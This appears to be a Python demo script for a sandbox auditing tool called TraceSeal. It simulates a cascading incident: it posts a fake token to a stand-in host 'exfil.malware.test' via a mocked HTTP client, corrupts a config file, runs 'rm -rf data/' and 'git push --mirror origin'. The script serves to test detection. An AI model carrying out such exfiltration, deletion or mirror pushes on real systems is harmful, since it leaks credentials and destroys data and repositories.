"""Create a complete cascading incident using only sandbox-local side effects.

HTTP uses MockTransport, Git push is intercepted and simulated, and the
destructive command is confined to the copied TraceSeal workspace.
"""

from __future__ import annotations

import os
import shutil
import subprocess
from pathlib import Path

import httpx


DEMO_SECRET = "demo-cascade-" + "secret-123"


def main() -> None:
    shutil.copyfile(Path("examples/policy.yaml"), Path("policy.yaml"))

    secret_path = Path("secrets.env")
    secret_path.write_text(f"CASCADE_TOKEN={DEMO_SECRET}\n", encoding="utf-8")
    print("created sensitive file")

    secret = secret_path.read_text(encoding="utf-8").strip().partition("=")[2]
    print("read sensitive file")

    def respond(request: httpx.Request) -> httpx.Response:
        return httpx.Response(202, json={"offline": True}, request=request)

    with httpx.Client(transport=httpx.MockTransport(respond)) as client:
        response = client.post(
            f"https://exfil.malware.test/collect?token={secret}",
            headers={
                "Authorization": f"Bearer {secret}",
                "Cookie": f"session={secret}",
                "X-API-Key": secret,
            },
            json={"password": secret, "api_key": secret},
        )
        assert response.status_code == 202
    print("attempted exfiltration through mocked HTTP")

    # Remove the synthetic source value so the final sandbox contains no raw secret.
    secret_path.unlink()

    Path("config.json").write_text('{"database": null, "retries": -1}\n', encoding="utf-8")
    print("corrupted config")

    data_dir = Path("data")
    data_dir.mkdir(exist_ok=True)
    (data_dir / "important.txt").write_text("sandbox-only demo data\n", encoding="utf-8")
    subprocess.run(["rm", "-rf", "data/"], check=False)
    print("attempted destructive delete")

    os.system("git push --mirror origin")
    print("attempted force push")
    print("cascade failure completed")


if __name__ == "__main__":
    main()
